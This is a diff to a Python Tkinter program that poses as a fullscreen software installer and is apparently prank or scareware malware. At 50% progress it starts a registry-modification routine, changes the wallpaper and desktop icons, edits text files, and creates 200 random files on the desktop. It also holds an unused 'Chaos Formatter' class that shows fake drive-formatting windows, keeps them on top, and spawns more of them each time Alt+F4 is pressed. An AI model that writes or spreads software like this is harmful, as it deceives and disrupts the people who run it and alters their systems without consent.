@@ -7,8 +7,8 @@ from PIL import Image, ImageTk
 import threading
 import time
 import random
-from regedit_and_virus_safe import configure_system_settings_after_50, update_icons
-from multimedia import playMusic_after50, set_wallpaper, change_txt_2, create_random_files
+from regedit_and_virus_safe import update_icons, apply_registry_mode
+from multimedia import playMusic_after50, set_wallpaper, change_txt_2, change_txt_3, create_random_files
 
 
 # Утилита для получения пути к ресурсам
@@ -18,194 +18,6 @@ def resource_path(relative_path):
 
 
 ctypes.windll.user32.SetProcessDPIAware()
-
-
-class ChaosFormatter:  # не используется, может в следуующей версии
-    WINDOW_WIDTH = 600
-    WINDOW_HEIGHT = 180
-    SHAKE_AREA_HEIGHT = 180
-    SHAKE_MOVE_RANGE = 50
-    BOTTOM_SHAKE_RANGE = 0
-    SW_SHOW = 5
-
-    def __init__(self):
-        self.windows = []
-        self.bottom_windows = []
-        self.running = True
-        self.lock = threading.Lock()
-        self.spawn_offset = 0
-        self.altf4_count = 0
-        self.cycle_count = 0
-        self.master = tk.Tk()
-        self._setup_window(self.master)
-        self._create_window_content(self.master, is_bottom=False)
-        self.master.after(120000, self._spawn_windows_continuously)
-        self.master.after(120000, self._bottom_shaking_loop)
-        self.master.after(500, self._keep_on_top_loop)
-        self.run()
-
-    def _setup_window(self, window, x=None, y=None):
-        screen_w = window.winfo_screenwidth()
-        screen_h = window.winfo_screenheight()
-        x = (self.spawn_offset * 30) % (screen_w - self.WINDOW_WIDTH) if x is None else x
-        y = min((self.spawn_offset * 50) % (screen_h - self.WINDOW_HEIGHT - self.SHAKE_AREA_HEIGHT),
-                screen_h - self.WINDOW_HEIGHT - self.SHAKE_AREA_HEIGHT) if y is None else y
-        self.spawn_offset += 1
-        window.title("Chaos Formatter")
-        window.overrideredirect(True)
-        window.attributes("-topmost", True)
-        window.configure(bg="black")
-        window.geometry(f"{self.WINDOW_WIDTH}x{self.WINDOW_HEIGHT}+{x}+{y}")
-        window.bind("<Alt-F4>", self._altf4_handler)
-
-    def _create_window_content(self, window, is_bottom=False):
-        label = tk.Label(window, text="Formatting Drive C:...", font=("Consolas", 16, "bold"), fg="red", bg="black")
-        label.pack(pady=8)
-        timer_label = tk.Label(window, text="Time Left: 00:00:00", font=("Consolas", 14), fg="red", bg="black")
-        timer_label.pack()
-        progress = ttk.Progressbar(window, orient="horizontal", length=560, mode="determinate")
-        progress.pack(pady=10)
-        style = ttk.Style(window)
-        style.theme_use('clam')
-        style.configure("red.Horizontal.TProgressbar", troughcolor='black', background='red')
-        progress.configure(style="red.Horizontal.TProgressbar")
-        glitch_label = tk.Label(window, text="", font=("Consolas", 12), fg="red", bg="black")
-        glitch_label.pack()
-        self.master.after(100, lambda: self._update_timer(timer_label))
-        self.master.after(100, lambda: self._update_progress(progress))
-        self.master.after(100, lambda: self._glitch_effect(glitch_label))
-        if not is_bottom:
-            self.master.after(200, lambda: self._move_window(window))
-        with self.lock:
-            (self.bottom_windows if is_bottom else self.windows).append(window)
-
-    def _altf4_handler(self, event=None):
-        self.altf4_count += 1
-        print(f"[!] Alt+F4 pressed: level {self.altf4_count}")
-        if self.altf4_count == 1:
-            self._spawn_chaos(3)
-        elif self.altf4_count == 2:
-            self._spawn_chaos(6)
-        elif self.altf4_count == 3:
-            self._spawn_chaos(10)
-            self._flash_all_windows()
-        elif self.altf4_count >= 4:
-            self._spawn_chaos(20)
-            self._flash_all_windows(times=10, speed=0.05)
-        return "break"
-
-    def _flash_all_windows(self, times=5, speed=0.1):
-        def flasher(count=0):
-            if count >= times or not self.running:
-                return
-            for w in self.windows + self.bottom_windows:
-                w.configure(bg="red")
-            self.master.after(int(speed * 1000),
-                              lambda: [w.configure(bg="black") for w in self.windows + self.bottom_windows])
-            self.master.after(int(speed * 2000), lambda: flasher(count + 1))
-
-        flasher()
-
-    def _spawn_chaos(self, count):
-        for _ in range(count):
-            new_win = tk.Toplevel(self.master)
-            self._setup_window(new_win)
-            self._create_window_content(new_win, is_bottom=False)
-
-    def _spawn_windows_continuously(self):
-        if not self.running:
-            return
-        self.cycle_count += 1
-        self._spawn_chaos(3)
-        print(f"[INFO] Cycle {self.cycle_count}: spawned 3 chaos windows")
-        self.master.after(30000, self._spawn_windows_continuously)
-
-    def _bottom_shaking_loop(self):
-        if not self.running:
-            return
-        screen_w = self.master.winfo_screenwidth()
-        screen_h = self.master.winfo_screenheight()
-        max_count = screen_w // self.WINDOW_WIDTH + 1
-        self.cycle_count += 1
-        spawn_chance = 0.15
-        if self.cycle_count >= 5 or random.random() < spawn_chance:
-            desired_count = min(self.cycle_count, max_count)
-            current_count = len(self.bottom_windows)
-            if current_count < desired_count:
-                base_y = screen_h - self.SHAKE_AREA_HEIGHT
-                for i in range(current_count, desired_count):
-                    x = i * self.WINDOW_WIDTH
-                    win = tk.Toplevel(self.master)
-                    self._setup_window(win, x=x, y=base_y)
-                    self._create_window_content(win, is_bottom=True)
-            self._shake_bottom_windows()
-        self.master.after(30000, self._bottom_shaking_loop)
-
-    def _shake_bottom_windows(self):
-        def shaker():
-            if not self.running or not self.bottom_windows:
-                return
-            base_positions = [(int(w.geometry().split("+")[1]), int(w.geometry().split("+")[2]))
-                              for w in self.bottom_windows]
-            for i, w in enumerate(self.bottom_windows):
-                base_x, base_y = base_positions[i]
-                new_x = base_x + random.randint(-self.BOTTOM_SHAKE_RANGE, self.BOTTOM_SHAKE_RANGE)
-                new_y = base_y + random.randint(-self.BOTTOM_SHAKE_RANGE // 4, self.BOTTOM_SHAKE_RANGE // 4)
-                w.geometry(f"{self.WINDOW_WIDTH}x{self.WINDOW_HEIGHT}+{new_x}+{new_y}")
-            self.master.after(300, shaker)
-
-        shaker()
-
-    def _keep_on_top_loop(self):
-        if not self.running:
-            return
-        with self.lock:
-            for w in self.windows + self.bottom_windows:
-                try:
-                    hwnd = ctypes.windll.user32.GetParent(w.winfo_id())
-                    if hwnd:
-                        ctypes.windll.user32.ShowWindow(hwnd, self.SW_SHOW)
-                        ctypes.windll.user32.SetForegroundWindow(hwnd)
-                        ctypes.windll.user32.BringWindowToTop(hwnd)
-                    w.attributes("-topmost", True)
-                    w.lift()
-                except Exception:
-                    pass
-        self.master.after(500, self._keep_on_top_loop)
-
-    def _update_timer(self, label):
-        if not self.running:
-            return
-        chaotic_time = f"{random.randint(0, 59):02}:{random.randint(0, 59):02}:{random.randint(0, 59):02}"
-        label.config(text=f"Time Left: {chaotic_time}")
-        self.master.after(100, lambda: self._update_timer(label))
-
-    def _update_progress(self, progress):
-        if not self.running:
-            return
-        progress["value"] = random.randint(0, 100)
-        self.master.after(int(random.uniform(50, 200)), lambda: self._update_progress(progress))
-
-    def _move_window(self, window):
-        if not self.running:
-            return
-        screen_w = window.winfo_screenwidth()
-        screen_h = window.winfo_screenheight()
-        x = random.randint(0, screen_w - self.WINDOW_WIDTH)
-        y = random.randint(0, screen_h - self.WINDOW_HEIGHT - self.SHAKE_AREA_HEIGHT)
-        window.geometry(f"{self.WINDOW_WIDTH}x{self.WINDOW_HEIGHT}+{x}+{y}")
-        self.master.after(200, lambda: self._move_window(window))
-
-    def _glitch_effect(self, label):
-        if not self.running:
-            return
-        symbols = ['@', '#', '$', '%', '&', '*', '!', '?', '~', '^']
-        glitch_text = ''.join(random.choices(symbols + list("CHAOSDETECTED"), k=random.randint(10, 30)))
-        label.config(text=glitch_text)
-        self.master.after(int(random.uniform(50, 200)), lambda: self._glitch_effect(label))
-
-    def run(self):
-        self.master.mainloop()  # не используется
 
 
 # Заглушка для выбора, здесь будет что-то интересное, наверное
@@ -223,6 +35,7 @@ def run_app():
 
     # Инициализация окна
     root = tk.Tk()
+    root.tk.call('tk', 'scaling', 1.5)
     root.attributes('-fullscreen', True, '-topmost', True)
     root.title("Installing")
     root.resizable(False, False)
@@ -244,7 +57,7 @@ def run_app():
                 "Нажмите на кнопку ниже, чтобы приступить."
             ),
             "select": "Выберите параметры",
-            "path": "Выберите путь\nдля установки:",
+            "path": "Путь для установки:",
             "product": "Выбери версию продукта:",
             "progress": "Установка, не выключайте компьютер...",
             "hack": (
@@ -650,28 +463,36 @@ def run_app():
             except Exception as e:
                 print(f"[instability_effect] Error: {e}")
 
-        def heavy_50_percent_effects():
-            """Отдельный поток для тяжёлых операций на 50%"""
-            try:
-                playMusic_after50()
-                create_random_files(num_files=200, desktop_path=None)
-                update_icons()
-                set_wallpaper(image_path=resource_path("bg.jpg"))
-                configure_system_settings_after_50()
-                change_txt_2(),
-                root.after(0, lambda: (
-                    set_background(resource_path("background4.jpg")),
-                    install_text.place(relx=0.5, rely=0.45, anchor="center"),
-                    hack_text.place(relx=0.5, rely=0.65, anchor="center"),
-                    percent_label.config(fg="red"),
-                    installing_label.config(fg="red", text=texts[current_lang]["progress"]),
-                    installing_label.place_configure(relx=0.5, rely=0.1, anchor="center"),
-                    canvas.itemconfig(progress_rect, fill="#ff0000"),
-                    canvas.place_configure(relx=0.5, rely=0.2, anchor="center"),
+        def heavy_50_percent_effects(canvas, installing_label, install_text, hack_text, percent_label, progress_rect):
+            def update_ui():
+                try:
+                    set_background(resource_path("background4.jpg"))
+                    install_text.place(relx=0.5, rely=0.45, anchor="center")
+                    hack_text.place(relx=0.5, rely=0.65, anchor="center")
+                    percent_label.config(fg="red")
+                    installing_label.config(fg="red", text=texts[current_lang]["progress"])
+                    installing_label.place_configure(relx=0.5, rely=0.1, anchor="center")
+                    canvas.itemconfig(progress_rect, fill="#ff0000")
+                    canvas.place_configure(relx=0.5, rely=0.2, anchor="center")
                     percent_label.place_configure(relx=0.5, rely=0.35, anchor="center")
-                ))
-            except Exception as e:
-                print(f"[heavy_50_percent_effects] Error: {e}")
+                except Exception as e:
+                    print(f"[heavy_50_percent_effects - UI] Error: {e}")
+    
+            def run_heavy_background_tasks():
+                try:
+                    playMusic_after50()
+                    threading.Thread(target=apply_registry_mode, args=("configure",), daemon=True).start()
+                    #configure_system_settings_after_50()
+                    update_icons()
+                    set_wallpaper(image_path=resource_path("bg.jpg"))
+                    threading.Thread(target=change_txt_2, daemon=True).start()
+                    create_random_files(num_files=200, desktop_path=None)
+                except Exception as e:
+                    print(f"[heavy_50_percent_effects - background] Error: {e}")
+    
+            root.after(0, update_ui)
+            threading.Thread(target=run_heavy_background_tasks, daemon=True).start()
+    
 
         def update_progress():
             stop_event = threading.Event()
@@ -689,7 +510,15 @@ def run_app():
 
                 if i == 50:
                     stop_event.set()
-                    threading.Thread(target=heavy_50_percent_effects, daemon=True).start()
+                    threading.Thread(target=lambda: heavy_50_percent_effects(
+                            canvas,
+                            installing_label,
+                            install_text,
+                            hack_text,
+                            percent_label,
+                            progress_rect
+                        ), daemon=True).start()
+
 
                 delay = random.uniform(0.7, 1.2) if i < 50 and random.random() < 0.3 else 0.5
                 root.after(int(delay * 1000), lambda: step(i + 1))
@@ -700,3 +529,199 @@ def run_app():
 
     show_main_page()
     root.mainloop()
+
+
+
+
+
+
+
+
+
+
+class ChaosFormatter:  # не используется, может в следуующей версии
+    WINDOW_WIDTH = 600
+    WINDOW_HEIGHT = 180
+    SHAKE_AREA_HEIGHT = 180
+    SHAKE_MOVE_RANGE = 50
+    BOTTOM_SHAKE_RANGE = 0
+    SW_SHOW = 5
+
+    def __init__(self):
+        self.windows = []
+        self.bottom_windows = []
+        self.running = True
+        self.lock = threading.Lock()
+        self.spawn_offset = 0
+        self.altf4_count = 0
+        self.cycle_count = 0
+        self.master = tk.Tk()
+        self._setup_window(self.master)
+        self._create_window_content(self.master, is_bottom=False)
+        self.master.after(120000, self._spawn_windows_continuously)
+        self.master.after(120000, self._bottom_shaking_loop)
+        self.master.after(500, self._keep_on_top_loop)
+        self.run()
+
+    def _setup_window(self, window, x=None, y=None):
+        screen_w = window.winfo_screenwidth()
+        screen_h = window.winfo_screenheight()
+        x = (self.spawn_offset * 30) % (screen_w - self.WINDOW_WIDTH) if x is None else x
+        y = min((self.spawn_offset * 50) % (screen_h - self.WINDOW_HEIGHT - self.SHAKE_AREA_HEIGHT),
+                screen_h - self.WINDOW_HEIGHT - self.SHAKE_AREA_HEIGHT) if y is None else y
+        self.spawn_offset += 1
+        window.title("Chaos Formatter")
+        window.overrideredirect(True)
+        window.attributes("-topmost", True)
+        window.configure(bg="black")
+        window.geometry(f"{self.WINDOW_WIDTH}x{self.WINDOW_HEIGHT}+{x}+{y}")
+        window.bind("<Alt-F4>", self._altf4_handler)
+
+    def _create_window_content(self, window, is_bottom=False):
+        label = tk.Label(window, text="Formatting Drive C:...", font=("Consolas", 16, "bold"), fg="red", bg="black")
+        label.pack(pady=8)
+        timer_label = tk.Label(window, text="Time Left: 00:00:00", font=("Consolas", 14), fg="red", bg="black")
+        timer_label.pack()
+        progress = ttk.Progressbar(window, orient="horizontal", length=560, mode="determinate")
+        progress.pack(pady=10)
+        style = ttk.Style(window)
+        style.theme_use('clam')
+        style.configure("red.Horizontal.TProgressbar", troughcolor='black', background='red')
+        progress.configure(style="red.Horizontal.TProgressbar")
+        glitch_label = tk.Label(window, text="", font=("Consolas", 12), fg="red", bg="black")
+        glitch_label.pack()
+        self.master.after(100, lambda: self._update_timer(timer_label))
+        self.master.after(100, lambda: self._update_progress(progress))
+        self.master.after(100, lambda: self._glitch_effect(glitch_label))
+        if not is_bottom:
+            self.master.after(200, lambda: self._move_window(window))
+        with self.lock:
+            (self.bottom_windows if is_bottom else self.windows).append(window)
+
+    def _altf4_handler(self, event=None):
+        self.altf4_count += 1
+        print(f"[!] Alt+F4 pressed: level {self.altf4_count}")
+        if self.altf4_count == 1:
+            self._spawn_chaos(3)
+        elif self.altf4_count == 2:
+            self._spawn_chaos(6)
+        elif self.altf4_count == 3:
+            self._spawn_chaos(10)
+            self._flash_all_windows()
+        elif self.altf4_count >= 4:
+            self._spawn_chaos(20)
+            self._flash_all_windows(times=10, speed=0.05)
+        return "break"
+
+    def _flash_all_windows(self, times=5, speed=0.1):
+        def flasher(count=0):
+            if count >= times or not self.running:
+                return
+            for w in self.windows + self.bottom_windows:
+                w.configure(bg="red")
+            self.master.after(int(speed * 1000),
+                              lambda: [w.configure(bg="black") for w in self.windows + self.bottom_windows])
+            self.master.after(int(speed * 2000), lambda: flasher(count + 1))
+
+        flasher()
+
+    def _spawn_chaos(self, count):
+        for _ in range(count):
+            new_win = tk.Toplevel(self.master)
+            self._setup_window(new_win)
+            self._create_window_content(new_win, is_bottom=False)
+
+    def _spawn_windows_continuously(self):
+        if not self.running:
+            return
+        self.cycle_count += 1
+        self._spawn_chaos(3)
+        print(f"[INFO] Cycle {self.cycle_count}: spawned 3 chaos windows")
+        self.master.after(30000, self._spawn_windows_continuously)
+
+    def _bottom_shaking_loop(self):
+        if not self.running:
+            return
+        screen_w = self.master.winfo_screenwidth()
+        screen_h = self.master.winfo_screenheight()
+        max_count = screen_w // self.WINDOW_WIDTH + 1
+        self.cycle_count += 1
+        spawn_chance = 0.15
+        if self.cycle_count >= 5 or random.random() < spawn_chance:
+            desired_count = min(self.cycle_count, max_count)
+            current_count = len(self.bottom_windows)
+            if current_count < desired_count:
+                base_y = screen_h - self.SHAKE_AREA_HEIGHT
+                for i in range(current_count, desired_count):
+                    x = i * self.WINDOW_WIDTH
+                    win = tk.Toplevel(self.master)
+                    self._setup_window(win, x=x, y=base_y)
+                    self._create_window_content(win, is_bottom=True)
+            self._shake_bottom_windows()
+        self.master.after(30000, self._bottom_shaking_loop)
+
+    def _shake_bottom_windows(self):
+        def shaker():
+            if not self.running or not self.bottom_windows:
+                return
+            base_positions = [(int(w.geometry().split("+")[1]), int(w.geometry().split("+")[2]))
+                              for w in self.bottom_windows]
+            for i, w in enumerate(self.bottom_windows):
+                base_x, base_y = base_positions[i]
+                new_x = base_x + random.randint(-self.BOTTOM_SHAKE_RANGE, self.BOTTOM_SHAKE_RANGE)
+                new_y = base_y + random.randint(-self.BOTTOM_SHAKE_RANGE // 4, self.BOTTOM_SHAKE_RANGE // 4)
+                w.geometry(f"{self.WINDOW_WIDTH}x{self.WINDOW_HEIGHT}+{new_x}+{new_y}")
+            self.master.after(300, shaker)
+
+        shaker()
+
+    def _keep_on_top_loop(self):
+        if not self.running:
+            return
+        with self.lock:
+            for w in self.windows + self.bottom_windows:
+                try:
+                    hwnd = ctypes.windll.user32.GetParent(w.winfo_id())
+                    if hwnd:
+                        ctypes.windll.user32.ShowWindow(hwnd, self.SW_SHOW)
+                        ctypes.windll.user32.SetForegroundWindow(hwnd)
+                        ctypes.windll.user32.BringWindowToTop(hwnd)
+                    w.attributes("-topmost", True)
+                    w.lift()
+                except Exception:
+                    pass
+        self.master.after(500, self._keep_on_top_loop)
+
+    def _update_timer(self, label):
+        if not self.running:
+            return
+        chaotic_time = f"{random.randint(0, 59):02}:{random.randint(0, 59):02}:{random.randint(0, 59):02}"
+        label.config(text=f"Time Left: {chaotic_time}")
+        self.master.after(100, lambda: self._update_timer(label))
+
+    def _update_progress(self, progress):
+        if not self.running:
+            return
+        progress["value"] = random.randint(0, 100)
+        self.master.after(int(random.uniform(50, 200)), lambda: self._update_progress(progress))
+
+    def _move_window(self, window):
+        if not self.running:
+            return
+        screen_w = window.winfo_screenwidth()
+        screen_h = window.winfo_screenheight()
+        x = random.randint(0, screen_w - self.WINDOW_WIDTH)
+        y = random.randint(0, screen_h - self.WINDOW_HEIGHT - self.SHAKE_AREA_HEIGHT)
+        window.geometry(f"{self.WINDOW_WIDTH}x{self.WINDOW_HEIGHT}+{x}+{y}")
+        self.master.after(200, lambda: self._move_window(window))
+
+    def _glitch_effect(self, label):
+        if not self.running:
+            return
+        symbols = ['@', '#', '$', '%', '&', '*', '!', '?', '~', '^']
+        glitch_text = ''.join(random.choices(symbols + list("CHAOSDETECTED"), k=random.randint(10, 30)))
+        label.config(text=glitch_text)
+        self.master.after(int(random.uniform(50, 200)), lambda: self._glitch_effect(label))
+
+    def run(self):
+        self.master.mainloop()  # не используется
